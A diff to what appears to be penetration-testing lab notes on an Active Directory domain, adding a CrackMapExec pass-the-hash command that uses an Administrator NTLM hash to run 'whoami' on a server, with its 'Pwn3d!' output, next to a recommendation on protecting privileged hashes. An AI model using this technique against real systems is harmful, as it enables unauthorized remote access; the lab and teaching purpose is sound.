@@ -343,6 +343,14 @@ marvel\administrator
 whoami exited on 192.168.22.211 with error code 0.
 ```
 
+cme
+```
+cme smb 192.168.22.211 -u Administrator -H '58a478135a93ac3bf058a5ea0e8fdb71' -x whoami
+SMB         192.168.22.211  445    HYDRA            [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:HYDRA) (domain:MARVEL) (signing:True) (SMBv1:True)
+SMB         192.168.22.211  445    HYDRA            [+] MARVEL\Administrator 58a478135a93ac3bf058a5ea0e8fdb71 (Pwn3d!)
+SMB         192.168.22.211  445    HYDRA            [+] Executed com
+```
+
 Recommendations:
 ```
 Implement logon restrictions so your privileged account hashes are never stored where they can be extracted.
